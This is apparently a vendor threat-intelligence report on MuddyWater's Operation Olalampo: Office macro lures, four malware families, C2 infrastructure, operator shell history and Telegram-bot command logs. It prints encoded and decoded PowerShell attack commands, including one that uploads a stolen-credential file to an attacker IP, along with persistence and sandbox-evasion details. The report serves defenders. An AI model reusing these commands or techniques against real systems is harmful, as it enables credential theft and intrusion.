@@ -1,0 +1,874 @@
+Operation Olalampo: Inside MuddyWater’s Latest Campaign
+MuddyWater APT has launched a new cyber offensive operation, dubbed Operation Olalampo, deploying new malware variants and leveraging Telegram bots for command-and-control. Analysis of the campaign provides a glimpse into the group’s post-exploitation tactics, which largely align with their historical operations.
+
+
+← Blog
+Operation Olalampo: Inside MuddyWater’s Latest Campaign
+MuddyWater APT has launched a new cyber offensive operation, dubbed Operation Olalampo, deploying new malware variants and leveraging Telegram bots for command-and-control. Analysis of the campaign provides a glimpse into the group’s post-exploitation tactics, which largely align with their historical operations.
+
+February 20, 2026 · 28 min to read · Advanced Persistent Threats
+Malware
+MiddleEast
+MuddyWater
+NationState
+Olalampo
+ThreatIntelligence
+Introduction
+The Group-IB Threat Intelligence Team has identified a new cyber campaign attributed with high confidence to the Iranian threat actor known as MuddyWater. This campaign, dubbed Operation Olalampo, targeted multiple organizations and individuals primarily across the MENA region, aligning with the ongoing geopolitical tensions.
+
+First observed on 26 January 2026, the operation involved the deployment of several novel malware variants exhibiting tactical and technical overlap with samples previously attributed to the MuddyWater threat group. Notably, one variant leveraged a Telegram bot as a command-and-control (C2) channel.
+
+Monitoring of this Telegram C2 bot revealed valuable insight into MuddyWater’s post-exploitation activity, including executed commands, deployed tools, and data collection techniques. The bot’s activity also exposed limited historical usage in late 2025, indicating infrastructure reuse rather than a separate campaign, while the core tradecraft remains consistent with MuddyWater’s known operations.
+
+Key discoveries
+A targeted campaign primarily impacting organizations in the MENA region.
+Discovery of four new malware variants: a rust backdoor dubbed CHAR and two downloaders called GhostFetch and HTTP_VIP, in addition to an advanced backdoor called GhostBackDoor.
+Indicators suggesting AI-assisted malware development.
+Use of Telegram bot as a C2 channel, exposing post-exploitation activity.
+Discovery of the HTTP_VIP Custom python C2 server and its installation setup along with infected victims.
+Infrastructure overlap linking the campaign to historical MuddyWater operations dating back to October 2025.
+Who may find this blog interesting:
+Cyber Threat Intelligence and Threat Hunting Specialists.
+Cybersecurity Analysts and Corporate Security Teams.
+National Cybersecurity Centers and Intelligence Agencies.
+Computer Emergency Response Teams (CERTs).
+Malware and reverse engineering analysts.
+MuddyWater: Threat Intelligence Overview
+MuddyWater is a well-known Iranian-linked threat actor that has been active for several years, primarily targeting government, telecommunications, energy, and critical infrastructure sectors across the Middle East and beyond. The group is known for its use of spear-phishing campaigns, custom malware, and consistent post-exploitation tradecraft, and has been the subject of multiple public and private threat intelligence reports.
+
+Group-IB customers can access comprehensive and up-to-date intelligence on MuddyWater — including infrastructure, tooling, indicators, and activity tracking — via the Group-IB Threat Intelligence Portal.
+
+Additional technical details on malware referenced in this report are also available through Group-IB’s Malware Database and Malware Detonation Platform, which provides behavioural analysis and sandbox reports for known samples.
+
+
+Malware Profiles
+
+
+
+
+Technical Analysis
+The campaign involved multiple attacks against organizations and individuals primarily across the MENA region starting around 26 January 2026. This operation comes in alignment with the current geopolitical escalation in the region.
+
+These attacks follow similar patterns and align with the killchains previously observed in MuddyWater attacks; starting with a phishing email with microsoft office document attached to it that contain malicious macro code that decodes the embedded payload and drops it on the system and executes it, providing the adversary with remote control of the system. Although delivery methods across various attacks had similarities, multiple final payloads were observed including HTTP_VIP, GhostBackDoor, and CHAR. Furthermore, the analysis showed that in addition to phishing, MuddyWater actively sought to exploit recently disclosed vulnerabilities on public-facing servers.
+
+Figure 1. Overview of the Infection Attack Flow
+
+Microsoft Office Documents
+As part of Operation Olalampo, MuddyWater relied on various malicious Microsoft Office documents for malware delivery, tailored for distinct targets. Multiple document variants were observed during the campaign, all following the same macro-based execution logic with minor implementation differences.
+
+Variant #1: Excel Document With Accounting Tables
+The first observed variant is a malicious Microsoft Excel document mimicking an energy and marine services company in the Middle East. The targets of this variant are likely to be contractors associated with this organization or the organization itself. This variant leads to the deployment of CHAR backdoor.
+
+Figure 2. Malicious Microsoft Excel Before Enabling Macros
+
+Macro Functionality:
+
+Execution begins with the Workbook_Open event, which automatically triggers the main subroutine when the Excel file is opened, provided that macros are enabled.
+The macros will then decode the payload and drop it to the path “C:\Users\Public\Downloads\novaservice.exe.”
+The final payload is CHAR rust backdoor that uses telegram bot as a C2 server.
+Variant #2
+This variant also adopts the theme for the same energy and marine services company from Variant #1 and targets are likely to be contractors related to the target company or the target company itself, the document leads to the deployment of the GhostFetch Downloader which subsequently downloads GhostBackDoor.
+
+Figure 3. Malicious Microsoft Excel Shown on Variant #2
+
+Macro Functionality:
+
+Execution begins with The Workbook_Open() subroutine, which runs automatically when the Excel workbook is opened and macros are enabled.
+The script enters a wait() function that executes a nested loop structure to evade sandbox hooks for sleep functions.
+Next, the macro retrieves a decimal-encoded string stored in a hidden UI element (UserForm1.TextBox1.Text). Then decode it and finally drop it to C:\Users\Public\Documents\MicrosoftExcelUser.exe and execute it.
+The dropped payload is GhostFetch Downloader which then deploys GhostBackDoor.
+Variant #3
+The third variant is a Microsoft Word document carrying multiple themes such as flight tickets and reports. The targets of this variant seem to be individuals of interest and system integrator companies in the middle east. This variant leads to the deployment of  HTTP_VIP Downloader which then deploys Anydesk RMM
+
+
+
+
+
+
+Figure 4. Malicious Documents
+Macro Functionality:
+
+Execution begins with The Workbook_Open() subroutine, which runs automatically when the Excel workbook is opened and macros are enabled.
+The script enters a wait() function that executes a nested loop structure to evade sandbox hooks for sleep functions
+Next, the macro retrieves a decimal-encoded string stored in a hidden UI element (UserForm1.TextBox1.Text). Then decode it and finally drop it to C:\Users\<usernane>\Downloads\pic.LOG or C:\Users\Public\Documents\MicrosoftWordUser.exe and execute it.
+The dropped payload is HTTP_VIP Downloader that will download Anydesk RMM tool.
+Dropped Payloads
+The malicious document variants drop three distinct types of malware: two downloaders, named GhostFetch and HTTP_VIP, and one backdoor developed in Rust called CHAR according to its PDB path.
+
+GhostFetch (Downloader):
+GhostFetch is a first-stage downloader designed to fetch and execute secondary payloads directly in memory.
+
+Once the malware is executed, it will check if the command-line argument “static” is passed, and if so, it will start “explorer.exe shell:RecycleBinFolder”.
+
+Anti-Analysis & Evasion
+
+The malware is extremely sensitive to sandbox environments. It terminates immediately if it detects:
+
+Hardware Profiles: RAM < 2 GB, < 2 CPU cores, or fewer than 2 previously connected USB devices.
+User Activity: It validates mouse movements and checks screen resolution.
+Analysis Tools: It scans for debuggers, virtual machine artifacts, and AV software.
+Execution Timing: Uses GetTickCount64 to detect if it is being stepped through by an analyst.
+Persistence & Delivery
+
+Path: Copies itself to %LOCALAPPDATA%\microsoft\windows\burnutill\burn.exe but after minor edit so the hash searching of the file will not be valid as it will have different hash.
+Registry: Maintains persistence via the User Shell Folders\Startup path.
+Mechanism: Decodes a hardcoded C2 list (primary: promoverse[.]org) to download an AES-encrypted PE file. It then reflectively loads this payload into memory.
+The malware exhibits a behavior in which it attempts to re-execute itself multiple times after successfully fetching a second-stage payload from its command-and-control (C2) server. This is likely to retrieve any additional second-stage payloads the C2 might offer. This recurrent execution generates significant system noise, which could potentially trigger alerts for the security team. The exact reasoning behind this noisy, repeated self-execution remains unclear.
+
+Figure 5. GhostFetch Malware Process Tree
+
+GhostBackDoor (GhostFetch downloaded Second Stage):
+The second stage is a sophisticated backdoor that adapts its installation based on the  environment’s privileges:
+
+Administrative Access: Installs as a service named MicrosoftVersionUpdater.
+Security Tools Present: Masks itself using the Windows Recycle Bin ClassID ({645FF040-5081-101B-9F08-00AA002F954E}).
+Standard User: Defaults to the startup registry folder.
+Command & Control (C2) Functions
+
+Communications are AES-encrypted and use French-named API endpoints. The malware utilizes a granular command structure to evade network detection:
+
+Command	Action	Description
+1	Ping	Heartbeat check via /api/accueil/actualiser.
+3, 4, 5, 6	Interactive Shell	Separate commands to start CMD, write input, and read output, and close the interactive shell.
+URI to send result:
+
+·        /api/graphique/obtenir-donnees
+
+·        /api/graphique/consulter
+
+·        /api/accueil/televerser
+
+7,8	File Write	Create and populate files on the victim machine.
+URI to send result:
+
+·        /api/utilisateurs/enregistrer
+
+·        /api/accueil/filtrer
+
+9, 0xA	File Read	Request and retrieve data from local files.
+URI to send result:
+
+·        /api/accueil/rechercher
+
+0xB	Stop the malware from sleeping between connection	
+0xc	Re-run GhostFetch	Triggers the original downloader “%LOCALAPPDATA%\\Microsoft\\Windows\\BurnUtill\\burn.exe” to fetch more payloads.
+0x12, 0x16, 0x17, 0x18	Process Stream	Advanced management of input/output streams for created processes. Create processes and read from and write to their input/output streams, and close their handles.
+URI to send result:
+
+·        /api/authentification/renouveler_token
+
+·        /api/accueil/televerser
+
+The malware supports various commands, but its most notable feature is the fragmentation of operations. By using one command to spawn a command shell and distinct commands to interact with it, the malware fragments its network traffic. This behavior is likely designed to evade network detection engines and cause incomplete or delayed alerting.
+
+HTTP_VIP (Downloader):
+The HTTP_VIP malware is a native downloader that serves as a bridge for further exploitation. Its execution flow is highly selective:
+
+System Reconnaissance: Upon execution, it harvests the local username and computer name.
+Domain Guardrail: The malware performs a check for a hardcoded company domain belonging to a health care provider. If the infected machine is joined to this domain, the malware terminates execution. Further investigation revealed that the domain is associated with a honeypot, which the threat actor appears to have intentionally excluded.
+C2 Authentication: It connects to a command-and-control (C2) server “codefusiontech[.]org” to authenticate.
+Payload Deployment: It retrieves a file from the C2, writes it to a local directory, and executes it. In observed cases, the dropped payload is the legitimate AnyDesk RMM tool, used to provide the attacker with direct remote access.
+New HTTP_VIP Variant
+
+A new variant of the HTTP_VIP malware has been identified based on its PDB path and significant code similarities with earlier versions. Both variants share nearly identical initialization routines, including API resolution, system information collection, and C2 communication pattern — specifically the use of the /postifo URI to send victim information and /connect to retrieve instructions. The observation of two variants being deployed during Operation Olalampo suggests rapid development and a fast-paced nature to the operation.
+
+While the previously observed version acted as a downloader for a second-stage payload (specifically the AnyDesk RMM tool), the new identified variant operates as a standalone backdoor. It is capable of receiving and executing the following commands:
+
+Command ID	Description
+201	Start interactive shell (Output to /ecmd)
+202	Upload file (Output to /esend)
+203	Download file (Output to /erecv)
+210	Capture clipboard contents
+222	Update sleep/beacon interval
+CHAR (Rust Backdoor)
+This is a rust backdoor that represents a tactical shift for MuddyWater, utilizing a Rust-based backdoor controlled via Telegram bot.
+
+Below are the malicious commands supported by the C2:
+
+CMD: execute a CMD command
+PowerShell: execute a PowerShell command
+Change directory
+Analysis of the malware artifacts reveals that one of the command handlers exhibits signs of AI-assisted development. This aligns with recent reports from the Google Threat Intelligence team regarding MuddyWater’s use of Gemini to write malware. Specifically, we identified debug strings containing emojis — a trait rarely seen in human-authored code. We observed four instances of this anomaly, suggesting that the adversary likely used an AI model to generate specific code segments and failed to sanitize the debug strings before compilation; this can also be seen in the command-and-control logs from the telegram bot.
+
+Figure 6. Emojis present in CHAR backdoor
+
+Figure 6. Emojis present in CHAR backdoor
+
+Infrastructure Analysis
+While the CHAR backdoor leverages Telegram API as its command-and-control (C2) channel, the GhostBackDoor and HTTP_VIP malware communicates with a threat actor-controlled C2 servers, infrastructure analysis provides a unique insight into offensive cyber operations and helps understand the bigger picture of the attack. By understanding the C2 infrastructure, organizations can proactively defend against attacks by identifying adversarial infrastructure before attack launch. This intelligence is also valuable for attributing these attacks.
+
+C2 Server Analysis
+GhostFetch C2 Infrastructure
+The domain promoverse[.]org was used by the GhostFetch loader and the associated GhostBackDoor in this campaign. The C2 server was protected with cloudflare, however the real IP address was identified as 209[.]74[.]87[.]67 using Group-IB Threat Intelligence Portal. The URL endpoints used by the malware are described in the malware analysis section above.
+
+
+
+
+
+
+Figure 7. Infrastructure analysis with Group-IB’s Graph
+.
+Analysis revealed a direct link to previously observed MuddyWater infrastructure, specifically the domain (netvigil[.]org), which hosted identical HTML content as shown below and was used in earlier campaigns alongside the GhostFetch and GhostBackDoor malware back in October 2025.
+
+Figure 8. HTML content served during active C2 operation
+
+Additionally, a decoy website was observed on the server site that presents itself as “Promoverse – Digital Marketing & Brand Promotion” and runs on the server stack Werkzeug/3.1.5 Python/3.12.3. Based on its structure and content, the site is highly likely to have been generated using AI. Despite its legitimate appearance, the site is a single non-functional HTML webpage; its buttons serve only to scroll the page and lead nowhere outside. And social media buttons are empty as well.
+
+Figure 9. Decoy site observed on the C2 server.
+
+C2 Timeline Summary:
+
+Domain Registration Date	2025-12-21
+Certificate Validity Date	2026-01-07 to 2026-04-07
+Decoy Site Timeframe	~2026-01-15 to ~2026-01-25
+GhostFetch/GhostBackDoor C2 Timeframe	~2026-01-27 to ~2026-01-30
+The short operational window of the GhostFetch C2 infrastructure suggests that the threat actor either deploys additional tools following the initial compromise or dynamically rotates C2 servers during later stages of the intrusion.
+
+HTTP_VIP C2 Infrastructure
+Two domains were used by HTTP_VIP samples; miniquest[.]org and codefusiontech[.]org.
+
+The domain miniquest[.]org was registered via NameCheap on 2026-01-27T12:44:23Z and was protected with CloudFlare. The real IP address was identified as 159[.]198[.]43[.]141 via the SSL certificate using Group-IB Threat Intelligence Platform:
+
+
+
+
+
+
+Figure 10. Group-IB Threat Intelligence Platform showing results for miniquest[.]org domain
+The C2 is served using Werkzeug/3.1.5 Python/3.12.3 backend, below a detailed description is available for how the C2 is being set up.
+
+C2 Timeline Summary:
+
+Domain Registration Date	2026-01-27
+Certificate Validity Date	2026-02-01 to 2026-05-02
+HTTP_VIP C2 Timeframe	2026-02-02 to 2026-02-13
+The domain codefusiontech[.]org was registered via NameCheap on 2026-02-02T06:24:36.42Z, and was protected with CloudFlare as well. The real IP address was identified as 209[.]74[.]87[.]100 via the SSL certificate using Group-IB Threat Intelligence Platform:
+
+
+
+
+
+
+Figure 11. Group-IB Threat Intelligence Platform showing results for codefusiontech[.]org domain
+The C2 infrastructure was  served using a Werkzeug/3.1.5 Python/3.12.3 backend.  A detailed description of the C2  setup is provided below.
+
+C2 Timeline Summary:
+
+Domain Registration Date	2026-02-02
+Certificate Validity Date	2026-02-09 to 2026-05-10
+HTTP_VIP C2 Timeframe	2026-02-11 to 2026-02-15
+An open directory was discovered on the  same IP address, containing several RMM and post-exploitation tools. The root directory listing exposes FMAPP.exe / FMAPP.dll, which have also been observed in previous MuddyWater open-directory findings. The directory was exposed using a Python Simple HTTP server (SimpleHTTP/0.6 Python/3.12.3).
+
+Figure 12. Directory listing captured on 209[.]74[.]87[.]100 domain
+
+
+Server Side C2 Analysis
+During infrastructure analysis, we were able to obtain the source code running on the C2 server for HTTP_VIP. The C2 server supporting this malware is a custom-built web app using the Flask Python framework. It manages HTTP_VIP malware connections and maintains an sqlite database containing a list of compromised hosts.
+
+In addition to the source code of HTTP_VIP server we obtained the following:
+
+AnyDesk Binaries: Legitimate remote access tools used for direct control of infected hosts.
+FMAPP.dll: A malicious injector used to deploy a SOCKS5 reverse proxy, allowing the attacker to tunnel network traffic through the infected host.
+The server offers multiple API endpoints for the HTTP_VIP loader operation:
+
+Endpoint	Description
+/postinfo	Agent registration endpoint, which receives victim host information through POST request HTTP headers:
+X-Computer-Name
+X-Username
+X-Domain-Name
+X-Windows-Version
+X-Windows-Build
+X-Antivirus-Name
+When received, an entry is added to the agents database with the information.
+
+This endpoint response contains an agent_id.
+
+/content	Heartbeat endpoint which the HTTP_VIP communicates with regularly, it checks if there are any commands issued by the threat actor for the agent_id sent in the POST request body.
+The defined commands are list, select, upload, exit, delete. But only the upload command is implemented.
+
+If the upload command is issued then Anydesk will be deployed on the compromised host.
+
+It is worth noting that the server contains a base sample for Anydesk (AnyDesk.exe) and for each agent it creates a new sample (AnyDesk<agent_id>.exe) and adds random bytes of random size to it. This is an evasion technique used to randomize the hash of the sample without altering its logic.
+
+/upload-results	Used for downloading the Anydesk binary in chunks, the HTTP header X-ChunkId is used for managing the chunks.
+/ercv	Used to inform the server that all chunks were received after the download is finished using the /upload-results endpoint.
+The server performs IP-based geolocation to identify the victim’s country using IP info service:
+
+Figure 13. HTTP_VIP C2 server logic for determining victim location
+
+We also  identified a command history file detailing  how the C2 server is deployed. This helps explain our observations in the previously analyzed infrastructure, where  the active C2 server was observed on a python-based backend during the operational timeframe, after which Apache returned 503 error pages instead, once the operation ended.
+
+The setup works as follows:
+
+Apache is deployed and listens on ports 80 and 443, often serving a decoy website, or no content.
+The Python based C2 backend is deployed on port 8080.
+Ports 80 and 443 are allowed through the linux firewall, while port 8080 is blocked to prevent direct external access. Additionally, in some cases the Python C2 is bound to 127.0.0.1, making it not accessible from the internet.
+Incoming requests are received by Apache and internally forwarded to the python-based C2 HTTP server, enabling functional C2 communication.
+Once the Python backend is stopped, Apache returns 503 error messages.
+In effect, Apache functions as a front-end reverse proxy and TLS terminator, while the Python application operates as a local backend service accessible only via the loopback interface. Traffic routing is handled through Apache’s mod_proxy modules, creating a layered and secure web stack on a single host.
+
+Another notable artifact in the command history is the command “فئعط” which corresponds to the “tmux” command mistakenly typed while using another language. The Keyboard mapping indicates the language was set to Persian, which further strengthened the attribution.
+
+Figure 14. Keyboard mapping between english and persian for the “tmux” command
+
+The original command history shows the detailed deployment process:
+
+curl http://127.0.0.1:8080
+curl http://127.0.0.1:8080/test
+curl http://127.0.0.1:8080/
+sudo apt install apache2 -y
+sudo systemctl status apache2
+sudo ufw allow 80
+sudo ufw allow 443
+sudo ufw reload
+sudo mkdir -p /var/www/codefusiontech.org/public_html
+sudo chown -R $USER:$USER /var/www/codefusiontech.org
+sudo chmod -R 755 /var/www/codefusiontech.org
+nano /var/www/codefusiontech.org/public_html/index.html
+sudo nano /etc/apache2/sites-available/codefusiontech.org.conf
+sudo a2ensite codefusiontech.org.conf
+sudo a2dissite 000-default.conf
+sudo systemctl reload apache2
+sudo apt install certbot python3-certbot-apache -y
+sudo certbot --apache
+sudo a2enmod remoteip
+sudo nano /etc/apache2/conf-available/cloudflare.conf
+sudo a2enconf cloudflare
+sudo systemctl reload apache2
+curl -I https://codefusiontech.org
+sudo certbot renew --dry-run
+sudo nano /etc/apache2/ports.conf
+sudo nano /etc/apache2/sites-available/backend-8080.conf
+sudo a2ensite backend-8080.conf
+sudo a2enmod proxy
+sudo a2enmod proxy_http
+sudo a2enmod headers
+sudo systemctl restart apache2
+sudo nano /etc/apache2/sites-available/codefusiontech.org-proxy.conf
+sudo a2ensite codefusiontech.org-proxy.conf
+sudo systemctl reload apache2
+sudo ufw deny 8080
+sudo ufw reload
+curl http://127.0.0.1:8080
+python3 -m http.server 8080
+python3 -m http.server 8081
+ss -ltnp | grep :8080
+sudo nano /etc/apache2/ports.conf
+ls /etc/apache2/sites-enabled | grep 8080
+sudo a2dissite backend-8080.conf
+sudo systemctl restart apache2
+ss -ltnp | grep 8080
+sudo nano /etc/apache2/sites-available/codefusiontech.org-proxy.conf
+sudo a2ensite codefusiontech.org-proxy.conf
+sudo a2enmod proxy proxy_http headers
+sudo systemctl reload apache2
+python3 -m http.server 8080
+sudo nano /etc/apache2/sites-available/codefusiontech.org-proxy.conf
+sudo a2dissite codefusiontech.org.conf
+sudo systemctl reload apache2
+sudo nano /etc/apache2/sites-available/codefusiontech.org-proxy.conf
+sudo a2ensite codefusiontech.org-proxy.conf
+sudo a2enmod proxy proxy_http headers
+sudo systemctl reload apache2
+python3 -m http.server 8080
+sudo a2dissite codefusiontech.org.conf
+sudo systemctl reload apache2
+/etc/apache2/sites-available/codefusiontech.org-proxy.conf
+nano /etc/apache2/sites-available/codefusiontech.org-proxy.conf
+sudo a2ensite codefusiontech.org-proxy.conf
+sudo a2enmod proxy proxy_http headers
+sudo systemctl reload apache2
+python3 -m http.server 8080 --bind 127.0.0.1
+sudo apache2ctl -S
+sudo a2dissite codefusiontech.org-le-ssl.conf
+sudo systemctl reload apache2
+sudo a2ensite codefusiontech.org-proxy.conf
+sudo systemctl reload apache2
+sudo apache2ctl -S
+python3 -m http.server 8080 --bind 127.0.0.1
+cd http
+tmux new -s http
+sudo nano /etc/apache2/sites-available/codefusiontech.org-proxy.conf
+sudo systemctl reload apache2
+sudo nano /etc/apache2/sites-available/codefusiontech.org-proxy.conf
+sudo a2enmod headers proxy proxy_http
+sudo systemctl restart apache2
+sudo nano /etc/apache2/sites-available/codefusiontech.org-proxy.conf
+sudo a2ensite codefusiontech.org-proxy.conf
+sudo a2enmod proxy proxy_http headers
+sudo systemctl reload apache2
+tmux a -t http
+sudo systemctl reload apache2
+tmux a -t http
+python3 -m venv venv
+sudo apt install python3-venv
+python3 -m venv venv
+source venv/bin/activate
+python3 http_vip.py 
+pip install flask
+python3 http_vip.py 
+pip install prompt_toolkit
+python3 http_vip.py 
+pip install rich
+python3 http_vip.py 
+pip install requests
+python3 http_vip.py 
+pip install pycountry
+python3 http_vip.py 
+rm http_vip.py 
+nano http_vip.py
+python3 http_vip.py 
+tmux kill-session -t http
+tmux a -t http
+tmux new -t http
+tmux ls
+tmux a -t http-0
+tmux a -t http
+tmux a -t http-0
+tmux new -t http-0
+فئعط
+tmux
+tmux ls
+tmux a -t 7
+tmux
+xit
+exit
+tmux a -t http-0
+tmux a -t http-0
+tmux new -t http-0
+tmux ls
+tmux a -t http-18
+tmux ls
+tmux a -t http-18
+C2 Telegram Bot Analysis
+The Telegram bot used for C2 communication by the newly discovered CHAR malware provided a valuable source of intelligence. During the analysis of the sample of this malware, Group-IB Threat Intelligence Team discovered the name of the C2 Telegram bot, which revealed detailed information about MuddyWater operations and provided visibility into their hands-on keyboard activity and specific command sequences and post-exploitation TTPs.
+
+The bot’s first display name is Olalampo, and its username is stager_51_bot.
+
+Figure 15. C2 Telegram bot information
+
+The threat actor utilized the bot in two different timeframes, the first activity was observed in early October 2025 specifically between 6 of October and 12 of October. And the second in late January where the bot had a slightly different functionality:
+
+2026-01-28 → 2026-02-01
+
+Supported commands:
+/start — CHK.
+/cmd — CMD.
+/shell — POWER.
+/cd — CD
+2025-10-06 → 2025-10-12
+
+These commands are supported:
+/start — ACK and HELP.
+/prompt — execute in my ass.
+/cd — change directory
+Bot analysis revealed the execution of multiple Powershell commands as detailed below.
+
+Observed Command Execution
+Monitoring of the Telegram bot activity revealed the execution of multiple PowerShell commands indicative of post-exploitation activity.
+
+Command #1 –  Observed: 2025-10-12 08:46:28 and 2025-10-06 12:47:41
+
+The command attempts to execute FMAPP.exe under a new process. This is a legitimate executable that will sideload FMAPP.dll which could be a reverse socks5 proxy or Kalim backdoor, since both were observed in samples with that name.
+
+powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy
+RemoteSigned -EncodedCommand
+dgBhAGMAcgBvAHMAeQBzAGkAOwAkAHYAYQBjAHIAbwBzAHkAcwBpAD0AIgB2AGEAYwByAG8A
+cwB5AHMAaQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcA
+cgBhAG0ARABhAHQAYQBcAEYATQBBAFAAUAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQA
+eQBsAGUAIABIAGkAZABkAGUAbgA=
+Decoded:
+
+powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy
+RemoteSigned -EncodedCommand
+vacrosysi;$vacrosysi="vacrosysi";Start-Process c:\ProgramData\FMAPP.exe
+-WindowStyle Hidden
+Command #2 – Observed: 2025-10-06 12:40:18
+
+This command attempts to upload a file named cobe-notes.txt to an adversary-controlled C2 server. This file is noteworthy because it was previously observed in MuddyWater campaigns. It is known to contain credentials stolen by a custom browser infostealer employed by MuddyWater in earlier operations.
+
+powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy
+RemoteSigned -EncodedCommand
+YQBqADsAJABhAGoAPQAiAGEAagAiADsAJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMA
+dAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgADsAIAAkAHIA
+ZQBzAHAAIAA9ACAAJAB3AGMALgBVAHAAbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoA
+LwAvADEANAAzAC4AMQA5ADgALgA1AC4ANAAxADoANAA0ADMALwBzAHUAYwBjAGUAcwBzACIA
+LAAiAGMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAZABvAHcAbgBsAG8AYQBkAHMA
+XABjAG8AYgBlAC0AbgBvAHQAZQBzAC4AdAB4AHQAIgApADsA
+Decoded:
+
+powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy
+RemoteSigned -EncodedCommand aj;$aj="aj";$wc = New-Object
+System.Net.WebClient ; $resp
+$wc.UploadFile("hxxp://143[.]198[.]5[.]41:443/success","c:\users\public\
+downloads\cobe-notes.txt");
+Command #3 – Observed: 2025-10-06 12:35:21
+
+The command attempts to execute sh.exe under a new process. The binary could not be retrieved during analysis.
+
+powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy
+RemoteSigned -EncodedCommand
+dwBrAG4AbABoAGEAOwAkAHcAawBuAGwAaABhAD0AIgB3AGsAbgBsAGgAYQAiADsAUwB0AGEA
+cgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAHMA
+aAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
+Decoded:
+
+powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy
+RemoteSigned -EncodedCommand wknlha;$wknlha="wknlha";Start-Process
+c:\ProgramData\sh.exe -WindowStyle Hidden
+Command #4 – Observed: 2025-10-06 11:47:03
+
+The command attempts to run gshdoc_release_X64_GUI.exe under a new process. While the binary itself remains unidentified, its execution output was observed directly.
+
+powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy
+RemoteSigned -EncodedCommand
+ZgBkAGgAYgBxAHkAcgA7ACQAZgBkAGgAYgBxAHkAcgA9ACIAZgBkAGgAYgBxAHkAcgAiADsA
+UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQA
+YQBcAGcAcwBoAGQAbwBjAF8AcgBlAGwAZQBhAHMAZQBfAFgANgA0AF8ARwBVAEkALgBlAHgA
+ZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A
+Decoded:
+
+powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy
+RemoteSigned -EncodedCommand fdhbqyr;$fdhbqyr="fdhbqyr";Start-Process
+c:\ProgramData\gshdoc_release_X64_GUI.exe -WindowStyle Hidden
+We’ve also observed direct execution of gshdoc_release_X64_GUI.exe and the output it produced as follows:
+
+$ gshdoc_release_X64_GUI.exe gshdoc.exe
+
+after Sleeping:  60
+err empty command
+after Sleeping:  60
+err empty command
+after Sleeping:  60
+err empty command
+after Sleeping:  60
+err empty command
+after Sleeping:  60
+err empty command
+after Sleeping:  60
+err empty command
+after Sleeping:  60
+err empty command
+after Sleeping:  60
+err empty command
+after Sleeping:  60
+err empty command
+after Sleeping:  60
+err empty command
+after Sleeping:  60
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+err empty command
+after Sleeping:  2
+List of Executed Commands
+The executed commands indicate basic reconnaissance activity, including enumeration of the current user, domain membership, privileges, and IP configuration. Additional actions include local network scanning via ping, creation of scheduled tasks, and the ingress tool transfer which are then executed.
+
+--- 2026-02-01 13:50:35 --- whoami
+--- 2026-02-01 12:14:33 --- Unknown command: dir
+--- 2026-02-01 12:13:55 --- whoami
+--- 2026-02-01 10:53:22 --- whoami
+--- 2026-01-31 17:52:27 --- whoami
+--- 2026-01-31 17:30:06 --- whoami
+--- 2026-01-31 16:35:43 --- whoami
+--- 2026-01-30 23:15:10 --- whoami
+--- 2026-01-30 19:09:38 --- dir ..\\desktop
+--- 2026-01-30 19:08:50 --- dir
+--- 2026-01-30 19:08:09 --- nslookup ad
+--- 2026-01-30 19:08:06 --- ipconfig /all
+--- 2026-01-30 19:08:04 --- whoami
+--- 2026-01-28 17:53:20 --- whoami
+--- 2026-01-28 17:53:11 --- Unknown command: whoami
+--- 2026-01-28 17:13:12 --- taskkill /IM novaservice.exe
+--- 2026-01-28 16:05:05 --- whoami
+--- 2026-01-28 16:04:15 --- schtasks /create /sc daily /st 09:00 /tn \"DailyUpdate\" /tr \"C:\\Users\\Public\\Downloads\novaservice.exe\
+--- 2026-01-28 15:54:06 --- whoami
+--- 2026-01-28 15:53:57 --- whoami
+--- 2026-01-28 15:53:52 --- Unknown command: ?
+--- 2026-01-28 15:22:35 --- whoami /all
+--- 2026-01-28 15:18:04 --- whoami /all
+--- 2026-01-28 15:17:46 --- whoami
+--- 2026-01-28 15:05:37 --- whoami
